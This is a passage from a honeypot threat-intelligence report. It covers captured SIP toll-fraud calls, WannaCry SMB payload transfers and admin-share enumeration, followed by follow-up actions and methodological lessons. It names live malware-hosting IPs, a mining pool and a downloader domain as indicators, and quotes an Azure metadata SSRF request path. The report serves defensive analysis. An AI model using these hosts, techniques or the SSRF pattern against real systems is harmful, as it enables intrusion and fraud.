INVITE sip:00442039962635@62.238.47.215:5060 SIP/2.0
Via: SIP/2.0/UDP 0.0.0.0:54936;branch=z9hG4bK-a389c7cf…
From: <sip:manuf@0.0.0.0:54936>;tag=5cdee7218e34
To:   <sip:00442039962635@62.238.47.215:5060>
User-Agent: VOIP
Content-Type: application/sdp
…
m=audio 10800 RTP/AVP 0 8 101
a=rtpmap:0 PCMU/8000
a=rtpmap:8 PCMA/8000

→ SIP/2.0 404 Not Found
```

Note the spoofed `0.0.0.0` Via/From/Contact addresses and a standard G.711
(PCMU/PCMA) audio offer — this is a real call setup, not a scan. Dionaea correctly
answers `404 Not Found`.

### SMB: WannaCry's payload transfer, captured raw

The largest bistreams are all `smbd`, and the sizes are the finding:

```text
12,842,127  46.100.116.237   2026-09-05   (Iran)
12,795,750  196.221.158.217  2026-09-13   (Egypt)
12,745,665  39.36.251.182    2026-09-15   (Pakistan)
12,745,665  182.71.247.106   2026-09-15   (India)
12,745,665  190.134.109.203  2026-09-14   (Argentina)
12,745,665  88.236.11.172    2026-09-13   (Turkey)
12,745,665  88.230.161.68    2026-09-13   (Turkey)
12,745,665  85.105.242.74    2026-09-12   (Turkey)
```

**Six streams at byte-identical 12,745,665 from six unrelated IPs across four days.**
This is WannaCry's SMB payload delivery captured in raw form — the transfer that
produced the 5,267,459-byte extracted DLLs in §5. Source geography (Iran, Egypt,
Pakistan, India, Argentina, Turkey) is consistent with the worm's continued
circulation in regions holding large unpatched Windows populations.

Administrative-share enumeration is visible across the SMB corpus:

```text
977  c$      812  a$      221  xcd$
976  f$      783  d$      220  R$
839  b$      738  e$      206  xdf$
```

Hidden administrative shares (`C$`, `ADMIN$`-style) plus systematic single-letter
drive-letter guessing (`a$` through `f$`) — mapping what is reachable before
delivering a payload.

### MySQL queries: a genuine, documented limitation

Grepping 200 `mysqld` streams for SQL keywords returned nothing. MySQL's client
protocol is **binary wire format**, not plaintext: `COM_QUERY` packets carry a
length-prefixed binary header ahead of the statement text, so naive keyword matching
fails even though the streams are intact. Recovering the 1,165 queries counted in §5
requires a protocol parser (`tshark -Y mysql` or equivalent), not text extraction.
Recorded as a limitation of the method, not a gap in the data.

---


## 8. Actions arising

| Item | Why |
|---|---|
| **Fix mailoney source-IP capture** | Bind to `0.0.0.0:25` directly (removing the NAT redirect), or configure PROXY-protocol/`TPROXY` so the original source survives. Currently 100% data loss on attribution. |
| **Decide on `345gs5662d34`** | The box currently self-identifies as a honeypot to any scanner using this probe. Rejecting it is a one-line Cowrie change, at the cost of some realism-vs-visibility tradeoff. |
| **Correct the ~85k figure** | Use ~76,300 real Dionaea connections; `ftpdatalisten` is the sensor's own socket. |
| **Submit IOCs** | `185.93.89.72`, `5.182.210.174`, `176.65.139.235`, `2.26.136.128`, `198.144.179.82`, `2.27.248.13` are live payload hosts. None checked against public feeds yet. |
| ~~Triage the Dionaea PE32 DLLs~~ | **Done — 75 of 77 are WannaCry (§5); the other 2 are a Monero miner and a staged downloader (§7c).** |
| ~~Investigate the 2 MP4 files~~ | **Done — genuine MP4 video, bandwidth abuse (§7b).** |
| **Cap Cowrie download size** | `tmp_290ordr` reached 690 MB before failing. A size limit prevents a repeat of the session-26 disk exhaustion. |
| **Report WannaCry samples** | 75 confirmed samples; worth noting the continued EternalBlue propagation rate in any published writeup. |
| **Investigate the MCP scanner** | `clientInfo.name` was truncated in capture. Widening the stored body would identify who is scanning for exposed AI agent servers. |
| **Fix Dionaea's HTTP realism tell** | Module returns `Server: nginx` alongside a Python `SimpleHTTPServer` directory listing — trivially detectable. |
| ~~Mine the bistreams~~ | **Done (§7d)** — SIP destinations recovered, WannaCry SMB transfer identified. Remaining: `mssqld`, `pptpd`, `ftpd`, `Memcache` streams; MySQL needs a binary protocol parser. |
| **Report SIP toll-fraud IOCs** | +39 023 790 2850, +44 203 996 2635, and the Caribbean/Poland prefixes are reportable to VoIP abuse feeds. |
| **Submit second-stage IOCs** | `sm.monerorx.com:8800` (Monero pool) and `down.0814ok.info:8888` (staged downloader) alongside the payload-host list. |
| **Re-examine `emu_profiles` id=2** | Still an empty call list (open since session 26). |

---

## 9. Lessons

- **Verify field alignment before trusting parsed output.** The first credential
  extraction used `grep … | paste - -` and produced plausible-looking but reversed
  pairs (`admin/root`, `xc3511/root`). A proper JSON parse produced entirely
  different — and correct — results. Plausible output is not correct output.
- **Know which of your numbers are configuration artifacts.** Cowrie's 98% login
  "success rate" and Dionaea's 9,244 `ftpdatalisten` connections are both properties
  of the sensors, not of the attackers. Publishing either as a finding would be wrong.
- **A sensor that is `active` is not necessarily a sensor that is working.** Mailoney
  passed every liveness check for 24 days — service running, port listening, session
  count climbing — while recording zero usable attacker data.
- **Multi-sensor correlation finds what single-sensor analysis cannot.** The same SSH
  key appearing in both a Cowrie session and an HTTP POST body is only visible when
  the sensors are analyzed together.
- **Volume and value are unrelated.** The 11,408 `shell` commands were already known
  to be a phantom; the two most interesting captures in the corpus are single-instance
  shell scripts that kill rival malware.
- **Longer windows change conclusions.** Session 22 characterized the wp-honeypot as
  seeing Vite dev-server probing; across 24 days the dominant behavior is `.env`
  enumeration. A one-night sample was not representative.
- **File type is a first-class triage signal.** `file *` on the capture directories
  separated Linux IoT payloads from Windows ransomware from JSON attack bodies in one
  command — and the JSON files, which looked like uninteresting metadata, turned out
  to hold AWS SSRF, GraphQL introspection, and MCP scanning.
- **Identify malware by behaviour, not by hash lookup.** WannaCry was confirmed from
  its kill-switch domain, service names, and a constant 5,267,459-byte size — all
  visible via `strings` and `ls`, with no external service required.
- **The largest artifacts are rarely the most interesting.** The two biggest TTY logs
  were a `find /` and a bandwidth-abuse transfer; the most valuable were a 6 KB
  rival-malware killer and a human session with a 109-second pause in it.
- **Re-check a correlation before publishing it.** The apparent link between the
  SRVSVC/EternalBlue requests and the 75 WannaCry samples did not survive scrutiny:
  only 10 SRVSVC requests exist, and no WannaCry hash appears in the downloads table.
  Related by family, not linked request-to-payload.
- **Misspellings and typos make the best fingerprints.** `Microl office` (a
  hardcoded misspelling of "Microsoft Office") identifies a tool family more reliably
  than any version string — and the actors who randomise those fields prove the
  technique works.
- **Raw packet captures answer questions the structured tables cannot.** The Azure
  metadata SSRF (`/proxy?url=…/metadata/identity`) existed in no database column; it
  was only visible in the bistreams, on the third pass.
- **"Not in the schema" is not "not in the data."** The SIP destination numbers were
  written off as unrecoverable because `sip_commands` lacks a To/From column. They
  were in the raw bistreams the whole time. Check every storage layer before
  declaring something lost.
- **Identical file sizes across unrelated sources are a signature.** Six SMB streams
  at exactly 12,745,665 bytes from six countries is stronger evidence of a single
  worm than any individual sample.
